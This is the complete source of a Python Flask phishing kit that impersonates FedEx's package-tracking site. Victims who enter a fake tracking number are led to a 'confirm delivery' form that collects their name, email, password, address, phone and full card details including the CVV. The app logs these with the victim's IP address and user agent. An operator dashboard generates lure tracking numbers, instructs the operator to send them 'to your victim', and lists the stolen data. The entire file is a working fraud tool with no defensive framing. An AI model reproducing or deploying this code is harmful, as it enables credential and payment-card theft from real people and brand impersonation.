import os
import sqlite3
import random
import string
from datetime import datetime
from functools import wraps

from flask import Flask, request, redirect, url_for, session, render_template_string, flash

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-this-secret-key-joseph")

DB_PATH = os.environ.get("DB_PATH", "/tmp/fedex.db")

# ------------------ ADMIN CREDENTIALS ------------------
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "joseph")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "FedexAdmin2026!")


# ------------------ DATABASE ------------------
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS tracking_numbers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tracking_number TEXT UNIQUE NOT NULL,
            status TEXT DEFAULT 'In Transit',
            origin TEXT DEFAULT 'Memphis, TN',
            destination TEXT DEFAULT '',
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tracking_number TEXT NOT NULL,
            email TEXT DEFAULT '',
            password TEXT DEFAULT '',
            full_name TEXT DEFAULT '',
            address TEXT DEFAULT '',
            phone TEXT DEFAULT '',
            card_number TEXT DEFAULT '',
            card_expiry TEXT DEFAULT '',
            card_cvv TEXT DEFAULT '',
            ip_address TEXT DEFAULT '',
            user_agent TEXT DEFAULT '',
            submitted_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()


init_db()


def generate_tracking_number():
    """Realistic FedEx 12-digit tracking number."""
    return "".join(random.choices(string.digits, k=12))


# ------------------ ADMIN AUTH DECORATOR ------------------
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect("/admin/login")
        return f(*args, **kwargs)
    return decorated_function


# ------------------ TEMPLATES ------------------
BASE_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }}
  body {{ background: #f5f5f5; color: #333; }}
  .header {{ background: #4d148c; padding: 14px 30px; display: flex; align-items: center; justify-content: space-between; }}
  .logo {{ font-size: 28px; font-weight: bold; color: #fff; text-decoration: none; }}
  .logo span {{ color: #ff6600; }}
  .nav a {{ color: #fff; text-decoration: none; margin-left: 24px; font-size: 15px; }}
  .nav a:hover {{ text-decoration: underline; }}
  .container {{ max-width: 960px; margin: 40px auto; padding: 0 20px; }}
  .card {{ background: #fff; border-radius: 8px; padding: 30px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }}
  h1 {{ color: #4d148c; font-size: 26px; margin-bottom: 20px; }}
  .btn {{ background: #4d148c; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; cursor: pointer; }}
  .btn:hover {{ background: #3a0f6b; }}
  input[type=text], input[type=password], input[type=email], select {{
    width: 100%; padding: 11px; margin: 8px 0 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px;
  }}
  label {{ font-weight: bold; font-size: 14px; }}
  .flash {{ background: #e8f5e9; border: 1px solid #4caf50; color: #2e7d32; padding: 10px; border-radius: 4px; margin-bottom: 16px; }}
  .error {{ background: #fdecea; border: 1px solid #f44336; color: #c62828; padding: 10px; border-radius: 4px; margin-bottom: 16px; }}
  table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
  th, td {{ padding: 10px; border-bottom: 1px solid #ddd; text-align: left; font-size: 14px; }}
  th {{ background: #4d148c; color: #fff; }}
  .footer {{ text-align: center; padding: 24px; color: #777; font-size: 13px; }}
  .status-badge {{ padding: 3px 10px; border-radius: 12px; font-size: 12px; color: #fff; background: #ff9800; }}
</style>
</head>
<body>
<div class="header">
  <a class="logo" href="/">Fed<span>Ex</span></a>
  <div class="nav">
    <a href="/">Tracking</a>
    <a href="/shipping">Shipping</a>
    <a href="/locations">Locations</a>
    <a href="https://www.fedex.com/en-us/customer-support.html" target="_blank">Support</a>
  </div>
</div>
<div class="container">
  {content}
</div>
<div class="footer">&copy; 1995-2026 FedEx. All rights reserved.</div>
</body>
</html>"""

HOME_TEMPLATE = BASE_TEMPLATE.replace("{content}", """
<div class="card">
  <h1>Track Your Shipment</h1>
  <form method="POST" action="/track">
    <label for="tracking">Tracking Number</label>
    <input type="text" id="tracking" name="tracking" placeholder="Enter your tracking number" required>
    <button type="submit" class="btn">Track</button>
  </form>
</div>
""")

TRACKING_RESULT_TEMPLATE = BASE_TEMPLATE.replace("{content}", """
<div class="card">
  <h1>Shipment Details</h1>
  <table>
    <tr><th>Tracking Number</th><td>{{ t['tracking_number'] }}</td></tr>
    <tr><th>Status</th><td><span class="status-badge">{{ t['status'] }}</span></td></tr>
    <tr><th>Origin</th><td>{{ t['origin'] }}</td></tr>
    <tr><th>Destination</th><td>{{ t['destination'] }}</td></tr>
    <tr><th>Last Update</th><td>{{ t['created_at'] }}</td></tr>
  </table>
  <br>
  <h2>Confirm Delivery Details</h2>
  <form method="POST" action="/submit/{{ t['tracking_number'] }}">
    <label>Full Name</label><input type="text" name="full_name" required>
    <label>Email</label><input type="email" name="email" required>
    <label>Password (for delivery portal access)</label><input type="password" name="password" required>
    <label>Delivery Address</label><input type="text" name="address" required>
    <label>Phone Number</label><input type="text" name="phone" required>
    <label>Payment on Delivery - Card Number</label><input type="text" name="card_number" required>
    <label>Expiry (MM/YY)</label><input type="text" name="card_expiry" required>
    <label>CVV</label><input type="text" name="card_cvv" required>
    <button type="submit" class="btn">Confirm Delivery</button>
  </form>
</div>
""")

NOT_FOUND_TEMPLATE = BASE_TEMPLATE.replace("{content}", """
<div class="card">
  <h1>Tracking Number Not Found</h1>
  <p>The tracking number you entered could not be found. Please check the number and try again.</p>
  <br>
  <a href="/"><button class="btn">Try Again</button></a>
</div>
""")

CONFIRMED_TEMPLATE = BASE_TEMPLATE.replace("{content}", """
<div class="card">
  <h1>Delivery Confirmed</h1>
  <p>Thank you! Your delivery details have been submitted successfully. Your package will arrive at the scheduled time.</p>
  <br>
  <a href="/"><button class="btn">Back to Home</button></a>
</div>
""")

SHIPPING_TEMPLATE = BASE_TEMPLATE.replace("{content}", """
<div class="card">
  <h1>Shipping Services</h1>
  <p>FedEx offers a full range of shipping services to meet your delivery needs, including overnight, ground, and international shipping options.</p>
</div>
""")

LOCATIONS_TEMPLATE = BASE_TEMPLATE.replace("{content}", """
<div class="card">
  <h1>Find a Location</h1>
  <p>Use our network of FedEx Office and FedEx Ship Center locations to drop off or pick up your packages. With thousands of locations worldwide, we're always nearby.</p>
</div>
""")

ADMIN_LOGIN_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Login</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }}
  body {{ background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
  .header {{ position: fixed; top: 0; left: 0; right: 0; background: #4d148c; padding: 14px 30px; }}
  .logo {{ font-size: 28px; font-weight: bold; color: #fff; }}
  .logo span {{ color: #ff6600; }}
  .card {{ background: #fff; border-radius: 8px; padding: 30px; width: 360px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }}
  h1 {{ color: #4d148c; font-size: 22px; margin-bottom: 20px; }}
  .btn {{ background: #4d148c; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; cursor: pointer; width: 100%; }}
  input {{ width: 100%; padding: 11px; margin: 8px 0 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; }}
  label {{ font-weight: bold; font-size: 14px; }}
  .error {{ background: #fdecea; border: 1px solid #f44336; color: #c62828; padding: 10px; border-radius: 4px; margin-bottom: 16px; }}
  .footer {{ position: fixed; bottom: 0; left: 0; right: 0; text-align: center; padding: 16px; color: #777; font-size: 13px; }}
</style>
</head>
<body>
<div class="header"><div class="logo">Fed<span>Ex</span></div></div>
<div class="card">
  <h1>Admin Login</h1>
  {% if error %}<div class="error">{{ error }}</div>{% endif %}
  <form method="POST" action="/admin/login">
    <label>Username</label><input type="text" name="username" required>
    <label>Password</label><input type="password" name="password" required>
    <button type="submit" class="btn">Login</button>
  </form>
</div>
<div class="footer">&copy; 1995-2026 FedEx. All rights reserved.</div>
</body>
</html>"""

ADMIN_DASHBOARD_TEMPLATE = BASE_TEMPLATE.replace("{content}", """
<div class="card">
  <h1>Admin Dashboard</h1>
  <p>Logged in as <strong>{{ session['admin_username'] }}</strong> &nbsp;|&nbsp; <a href="/admin/logout">Logout</a></p>
  <br>
  <h2>Generate Tracking Number</h2>
  <form method="POST" action="/admin/generate">
    <label>Destination</label><input type="text" name="destination" placeholder="e.g. Houston, TX" required>
    <button type="submit" class="btn">Generate</button>
  </form>
  {% if new_number %}
  <div class="flash">Generated tracking number: <strong>{{ new_number }}</strong> &mdash; send it to your victim with link: /track?number={{ new_number }}</div>
  {% endif %}
  <h2>Active Tracking Numbers</h2>
  <table>
    <tr><th>Tracking Number</th><th>Status</th><th>Destination</th><th>Created</th></tr>
    {% for t in tracking_numbers %}
    <tr>
      <td>{{ t['tracking_number'] }}</td>
      <td><span class="status-badge">{{ t['status'] }}</span></td>
      <td>{{ t['destination'] }}</td>
      <td>{{ t['created_at'] }}</td>
    </tr>
    {% endfor %}
  </table>
  <h2>Captured Victim Details</h2>
  <table>
    <tr><th>Tracking #</th><th>Name</th><th>Email</th><th>Password</th><th>Address</th><th>Phone</th><th>Card #</th><th>Expiry</th><th>CVV</th><th>IP</th><th>Time</th></tr>
    {% for v in victims %}
    <tr>
      <td>{{ v['tracking_number'] }}</td>
      <td>{{ v['full_name'] }}</td>
      <td>{{ v['email'] }}</td>
      <td>{{ v['password'] }}</td>
      <td>{{ v['address'] }}</td>
      <td>{{ v['phone'] }}</td>
      <td>{{ v['card_number'] }}</td>
      <td>{{ v['card_expiry'] }}</td>
      <td>{{ v['card_cvv'] }}</td>
      <td>{{ v['ip_address'] }}</td>
      <td>{{ v['submitted_at'] }}</td>
    </tr>
    {% endfor %}
  </table>
</div>
""")


# ------------------ PUBLIC (VICTIM-FACING) ROUTES ------------------
@app.route("/")
def home():
    return render_template_string(HOME_TEMPLATE, title="FedEx | Tracking")


@app.route("/track", methods=["GET", "POST"])
def track():
    tracking = request.values.get("tracking", "").strip()
    if not tracking:
        return render_template_string(HOME_TEMPLATE, title="FedEx | Tracking")
    conn = get_db()
    row = conn.execute(
        "SELECT * FROM tracking_numbers WHERE tracking_number = ?", (tracking,)
    ).fetchone()
    conn.close()
    if row:
        return render_template_string(TRACKING_RESULT_TEMPLATE, title="FedEx | Shipment Details", t=row)
    return render_template_string(NOT_FOUND_TEMPLATE, title="FedEx | Not Found")


@app.route("/submit/<tracking>", methods=["POST"])
def submit(tracking):
    conn = get_db()
    exists = conn.execute(
        "SELECT 1 FROM tracking_numbers WHERE tracking_number = ?", (tracking,)
    ).fetchone()
    if exists:
        conn.execute(
            """INSERT INTO victims (tracking_number, email, password, full_name, address, phone,
               card_number, card_expiry, card_cvv, ip_address, user_agent)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                tracking,
                request.form.get("email", ""),
                request.form.get("password", ""),
                request.form.get("full_name", ""),
                request.form.get("address", ""),
                request.form.get("phone", ""),
                request.form.get("card_number", ""),
                request.form.get("card_expiry", ""),
                request.form.get("card_cvv", ""),
                request.headers.get("X-Forwarded-For", request.remote_addr or ""),
                request.headers.get("User-Agent", ""),
            ),
        )
        conn.commit()
    conn.close()
    return render_template_string(CONFIRMED_TEMPLATE, title="FedEx | Confirmed")


@app.route("/shipping")
def shipping():
    return render_template_string(SHIPPING_TEMPLATE, title="FedEx | Shipping")


@app.route("/locations")
def locations():
    return render_template_string(LOCATIONS_TEMPLATE, title="FedEx | Locations")


# ------------------ ADMIN ROUTES (PROTECTED) ------------------
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USERNAME and request.form.get("password") == ADMIN_PASSWORD:
            session["admin_logged_in"] = True
            session["admin_username"] = ADMIN_USERNAME
            return redirect("/admin")
        error = "Invalid username or password."
    return render_template_string(ADMIN_LOGIN_TEMPLATE, title="Admin Login", error=error)


@app.route("/admin/logout")
def admin_logout():
    session.clear()
    return redirect("/admin/login")


@app.route("/admin")
@admin_required
def admin_dashboard():
    conn = get_db()
    tracking_numbers = conn.execute(
        "SELECT * FROM tracking_numbers ORDER BY id DESC"
    ).fetchall()
    victims = conn.execute(
        "SELECT * FROM victims ORDER BY id DESC"
    ).fetchall()
    conn.close()
    new_number = request.args.get("generated", None)
    return render_template_string(
        ADMIN_DASHBOARD_TEMPLATE,
        title="Admin Dashboard",
        tracking_numbers=tracking_numbers,
        victims=victims,
        new_number=new_number,
    )


@app.route("/admin/generate", methods=["POST"])
@admin_required
def admin_generate():
    destination = request.form.get("destination", "").strip() or "Unknown"
    conn = get_db()
    while True:
        number = generate_tracking_number()
        exists = conn.execute(
            "SELECT 1 FROM tracking_numbers WHERE tracking_number = ?", (number,)
        ).fetchone()
        if not exists:
            break
    conn.execute(
        "INSERT INTO tracking_numbers (tracking_number, destination) VALUES (?, ?)",
        (number, destination),
    )
    conn.commit()
    conn.close()
    return redirect("/admin?generated=" + number)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
